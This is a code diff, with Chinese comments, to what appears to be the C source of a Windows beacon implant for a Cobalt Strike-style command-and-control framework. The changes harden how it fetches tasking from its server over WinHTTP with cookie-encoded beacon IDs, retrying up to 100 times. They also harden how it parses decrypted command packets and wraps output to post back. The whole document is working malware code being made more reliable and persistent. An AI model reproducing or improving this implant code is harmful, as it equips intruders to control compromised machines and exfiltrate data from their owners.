@@ -4,7 +4,7 @@
 
 #define MAX_HEADER_SIZE 1024
 
-char* removePrefixAndSuffix(unsigned char* data, unsigned char* prefix, unsigned char* suffix) {
+unsigned char* removePrefixAndSuffix(unsigned char* data, unsigned char* prefix, unsigned char* suffix) {
     size_t prefixLen = strlen(prefix);
     size_t suffixLen = strlen(suffix);
     size_t dataLen = strlen(data);
@@ -19,11 +19,10 @@ char* removePrefixAndSuffix(unsigned char* data, unsigned char* prefix, unsigned
 }
 
 unsigned char* parseGetResponse(unsigned char* data, size_t dataSize ,size_t* responsedatalen) {
-
     //去除 data= 和 %%
     data = removePrefixAndSuffix(data, Response_prepend, Response_append);
 
-    int data_length = strlen(data);
+    size_t data_length = strlen(data);
     unsigned char netbiosKey = 'a'; 
     size_t netbiosDecodeDataLen;
 
@@ -31,6 +30,7 @@ unsigned char* parseGetResponse(unsigned char* data, size_t dataSize ,size_t* re
     unsigned char* netbiosDecodeData = NetbiosDecode((unsigned char*)data, data_length, netbiosKey ,&netbiosDecodeDataLen);
 
     // 错误，Mask密钥都存在四个字节
+	// 如果小于5字节，说明数据有问题
     if (netbiosDecodeDataLen < 5) {
 		*responsedatalen = 0;
         return NULL;
@@ -56,15 +56,18 @@ unsigned char* parseGetResponse(unsigned char* data, size_t dataSize ,size_t* re
 
 
 unsigned char* parsePacket(unsigned char* decryptedBuf, uint32_t* totalLength, uint32_t* commandType ,size_t* commandBuflen, size_t* executeCount) {
-
     // 数据包格式：cmdType(4Bytes) | commandLen(4Bytes) | commandBuf || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...
-    // commandLen 只是 commandBuf 的长度
+
+    // 没有足够的 cmdType + commandLen
+    if (*totalLength < 8) {
+        return NULL;
+    }
 
     unsigned char* decryptedBuffer;
 
     if (*executeCount > 0) {
 
-        decryptedBuffer = decryptedBuf + (unsigned char)*executeCount;
+        decryptedBuffer = decryptedBuf + *executeCount;
     }
     else
     {
@@ -73,20 +76,27 @@ unsigned char* parsePacket(unsigned char* decryptedBuf, uint32_t* totalLength, u
 
     uint8_t commandTypeBytes[4];
     unsigned char* commandTypeBytesStart = decryptedBuffer;
-    memcpy(&commandTypeBytes, commandTypeBytesStart, 4);
+    memcpy(commandTypeBytes, commandTypeBytesStart, 4);
     *commandType = bigEndianUint32(commandTypeBytes);
 
     uint8_t commandLenBytes[4];
     unsigned char* commandLenBytesStart = decryptedBuffer + 4;
-    memcpy(&commandLenBytes, commandLenBytesStart, 4);
+    memcpy(commandLenBytes, commandLenBytesStart, 4);
     uint32_t commandLen = bigEndianUint32(commandLenBytes);
+
+	// 没有足够的 commandBuf
+    if(*totalLength < (8 + commandLen)) {
+        return NULL;
+	}
 
     unsigned char* commandBuf = (unsigned char*)malloc(commandLen);
     if (commandBuf) {
         unsigned char* commandBufStart = decryptedBuffer + 8;
         memcpy(commandBuf, commandBufStart, commandLen);
     }
-    *totalLength = *totalLength - (4 + 4 + commandLen); // 留下剩下的 command 数据包长度
+
+    // 留下剩下的数据包长度
+    *totalLength = *totalLength - (4 + 4 + commandLen); 
     *commandBuflen = commandLen;                        
 
     *executeCount = *executeCount + commandLen + 8;
@@ -95,115 +105,114 @@ unsigned char* parsePacket(unsigned char* decryptedBuf, uint32_t* totalLength, u
 }
 
 unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
-    // 这里需要注意，即使服务端没有指令，也会发送一些数据，所以这里返回一定不为空
-    // 类似于 data=nihcgakh%%
-    // 初始化 WinHttp 会话
-    HINTERNET hSession = WinHttpOpen(NULL,
-        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-        WINHTTP_NO_PROXY_NAME,
-        WINHTTP_NO_PROXY_BYPASS, 0);
+    const int MAX_RETRY = 100;         
+    const int RETRY_DELAY_MS = 5000; 
 
-    if (!hSession) {
-        fprintf(stderr, "WinHttpOpen Failed With Error: %lu", GetLastError());
-        return NULL;
-    }
+    int attempt = 0;
+    while (attempt < MAX_RETRY) {
+        attempt++;
 
-    // 连接到服务器
-    HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
+        // 初始化 WinHttp 会话
+        HINTERNET hSession = WinHttpOpen(NULL,
+            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+            WINHTTP_NO_PROXY_NAME,
+            WINHTTP_NO_PROXY_BYPASS, 0);
 
-    if (!hConnect) {
-        fprintf(stderr, "WinHttpConnect Failed With Error: %lu\n", GetLastError());
-        if (!WinHttpCloseHandle(hSession)) {
-            fprintf(stderr, "WinHttpCloseHandle Failed With Error for hSession: %lu\n", GetLastError());
-            return NULL;
-        }
-        return NULL;
-    }
-
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
-        L"GET",
-        get_path,
-        NULL,
-        WINHTTP_NO_REFERER,
-        WINHTTP_DEFAULT_ACCEPT_TYPES,
-        0);
-    if (!hRequest) {
-        fprintf(stderr, "WinHttpOpenRequest Failed With Error: %lu\n", GetLastError());
-        if (!WinHttpCloseHandle(hConnect)) {
-            fprintf(stderr, "WinHttpCloseHandle Failed With Error for hConnect: %lu\n", GetLastError());
-            return NULL;
-        }
-        if (!WinHttpCloseHandle(hSession)) {
-            fprintf(stderr, "WinHttpCloseHandle Failed With Error for hSession: %lu\n", GetLastError());
-            return NULL;
-        }
-        return NULL;
-    }
-
-    // 添加请求头
-    WinHttpAddRequestHeaders(hRequest, host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
-    WinHttpAddRequestHeaders(hRequest, cookie_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
-    WinHttpAddRequestHeaders(hRequest, user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
-
-    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
-        fprintf(stderr, "WinHttpSendRequest Failed With Error: %lu\n", GetLastError());
-        goto cleanup;
-        return NULL;
-    }
-
-    // 接受响应
-    if (!WinHttpReceiveResponse(hRequest, NULL)) {
-        fprintf(stderr, "WinHttpReceiveResponse Failed With Error: %lu\n", GetLastError());
-        goto cleanup;
-        return NULL;
-    }
-
-    DWORD bytesRead = 0;
-    unsigned char buffer[4096];
-    unsigned char* responseData = NULL;
-    size_t totalSize = 0;
-
-    // 读取响应体数据
-    do {
-        if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
-            fprintf(stderr, "WinHttpReadData Failed With Error: %lu\n", GetLastError());
-            free(responseData);
-            goto cleanup;
-            return NULL;
+        if (!hSession) {
+            fprintf(stderr, "WinHttpOpen Failed (attempt %d): %lu\n", attempt, GetLastError());
+            Sleep(RETRY_DELAY_MS);
+            continue;
         }
 
-        if (bytesRead > 0) {
-            unsigned char* temp = realloc(responseData, totalSize + bytesRead);
-            if (!temp) {
-                fprintf(stderr, "realloc Failed With Error：%lu\n", GetLastError());
+        // 连接服务器
+        HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
+        if (!hConnect) {
+            fprintf(stderr, "WinHttpConnect Failed (attempt %d): %lu\n", attempt, GetLastError());
+            WinHttpCloseHandle(hSession);
+            Sleep(RETRY_DELAY_MS);
+            continue;
+        }
+
+        HINTERNET hRequest = WinHttpOpenRequest(hConnect,
+            L"GET", get_path, NULL, WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+
+        if (!hRequest) {
+            fprintf(stderr, "WinHttpOpenRequest Failed (attempt %d): %lu\n", attempt, GetLastError());
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hSession);
+            Sleep(RETRY_DELAY_MS);
+            continue;
+        }
+
+        // 添加请求头
+        WinHttpAddRequestHeaders(hRequest, host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+        WinHttpAddRequestHeaders(hRequest, cookie_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+        WinHttpAddRequestHeaders(hRequest, user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+
+        // 发送请求
+        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+            fprintf(stderr, "WinHttpSendRequest Failed (attempt %d): %lu\n", attempt, GetLastError());
+            WinHttpCloseHandle(hRequest);
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hSession);
+            Sleep(RETRY_DELAY_MS);
+            continue;
+        }
+
+        // 接受响应
+        if (!WinHttpReceiveResponse(hRequest, NULL)) {
+            fprintf(stderr, "WinHttpReceiveResponse Failed (attempt %d): %lu\n", attempt, GetLastError());
+            WinHttpCloseHandle(hRequest);
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hSession);
+            Sleep(RETRY_DELAY_MS);
+            continue;
+        }
+
+        DWORD bytesRead = 0;
+        unsigned char buffer[4096];
+        unsigned char* responseData = NULL;
+        size_t totalSize = 0;
+
+        do {
+            if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
+                fprintf(stderr, "WinHttpReadData Failed: %lu\n", GetLastError());
                 free(responseData);
-                goto cleanup;
-                return NULL;
+                responseData = NULL;
+                break;
             }
-            responseData = temp;
-            memcpy(responseData + totalSize, buffer, bytesRead);
-            totalSize += bytesRead;
+
+            if (bytesRead > 0) {
+                unsigned char* temp = realloc(responseData, totalSize + bytesRead);
+                if (!temp) {
+                    fprintf(stderr, "realloc failed\n");
+                    free(responseData);
+                    responseData = NULL;
+                    break;
+                }
+                responseData = temp;
+                memcpy(responseData + totalSize, buffer, bytesRead);
+                totalSize += bytesRead;
+            }
+        } while (bytesRead > 0);
+
+        *responseSize = totalSize;
+
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+
+        if (responseData) {
+            return responseData; 
         }
-
-    } while (bytesRead > 0);
-
-    *responseSize = totalSize;
-
-    return responseData;
-
-cleanup:
-    if (!WinHttpCloseHandle(hRequest)) {
-		fprintf(stderr, "WinHttpCloseHandle Failed With Error for hRequest: %lu\n", GetLastError());
-        return NULL;
+        else {
+            Sleep(RETRY_DELAY_MS);
+        }
     }
-    if (!WinHttpCloseHandle(hConnect)) {
-        fprintf(stderr, "WinHttpCloseHandle Failed With Error for hConnect: %lu\n", GetLastError());
-        return NULL;
-    }
-    if (!WinHttpCloseHandle(hSession)) {
-        fprintf(stderr, "WinHttpCloseHandle Failed With Error for hSession: %lu\n", GetLastError());
-        return NULL;
-    }
+
+    return NULL;
 }
 
 unsigned char* makeBeaconIdHeader() {
@@ -220,7 +229,7 @@ unsigned char* makeBeaconIdHeader() {
     }
 
     // 转化为字符串
-    int rs = snprintf((char*)charId, charArrayLength, "%d", clientID);
+    int rs = snprintf((unsigned char*)charId, charArrayLength, "%d", clientID);
     if (rs < 0 || rs >= charArrayLength) {
         fprintf(stderr, "String conversion failed for clientID: %d\n", clientID);
         free(charId);
@@ -230,23 +239,39 @@ unsigned char* makeBeaconIdHeader() {
     size_t codelen;
 
     // XOR
+    // 返回二进制数据
+    // 不用添加 \0
     unsigned char* MaskEncodeId = MaskEncode(charId, strlen(charId), &codelen);
 
     unsigned char netbiosKey = 'A'; 
     size_t NetbiosEncodeIdLen;
 
     // NetBios
-    unsigned char* NetBoisId = NetbiosEncode(MaskEncodeId, strlen(MaskEncodeId), netbiosKey, &NetbiosEncodeIdLen);
-    NetBoisId[NetbiosEncodeIdLen] = '\0';
+    // 返回二进制数据
+    // 不用添加 \0
+    unsigned char* NetBoisId = NetbiosEncode(MaskEncodeId, codelen, netbiosKey, &NetbiosEncodeIdLen);
 
     unsigned char* header = "User:";
-    unsigned char* result = (unsigned char*)malloc(strlen(NetBoisId) + strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1);
+    unsigned char* result = (unsigned char*)malloc(NetbiosEncodeIdLen + strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1);
 
     // User:user=APNDCONJDOOBBMOKDPOB%%
-    snprintf(result, strlen(NetBoisId) + strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1, "%s%s%s%s", header, Http_post_id_prepend, NetBoisId, Http_post_id_append);
+    size_t offset = 0;
+    memcpy(result + offset, header, strlen(header));
+    offset += strlen(header);
+    memcpy(result + offset, Http_post_id_prepend, strlen(Http_post_id_prepend));
+    offset += strlen(Http_post_id_prepend);
+    memcpy(result + offset, NetBoisId, NetbiosEncodeIdLen);
+    offset += NetbiosEncodeIdLen;
+    memcpy(result + offset, Http_post_id_append, strlen(Http_post_id_append));
+    offset += strlen(Http_post_id_append);
 
+    // 添加 '\0' 方便字符串处理
+    result[offset] = '\0';
+
+    free(MaskEncodeId);
     free(NetBoisId);
     free(charId);
+
     return result;
 }
 
@@ -263,9 +288,12 @@ unsigned char* makePostData(unsigned char* postMsg, size_t msgLen, int callback)
     unsigned char* dataString = (unsigned char*)malloc(strlen(data) + strlen(Http_post_client_output_prepend) + strlen(Http_post_client_output_append) + 1);
 
     // data = post%%
-    strcpy(dataString, Http_post_client_output_prepend);
-    strcat(dataString, data);
-    strcat(dataString, Http_post_client_output_append);
+    // strcat 会自动写入 \0
+    if (dataString) {
+        strcpy(dataString, Http_post_client_output_prepend);
+        strcat(dataString, data);
+        strcat(dataString, Http_post_client_output_append);
+    }
 
     free(finalPaket);
     free(data);
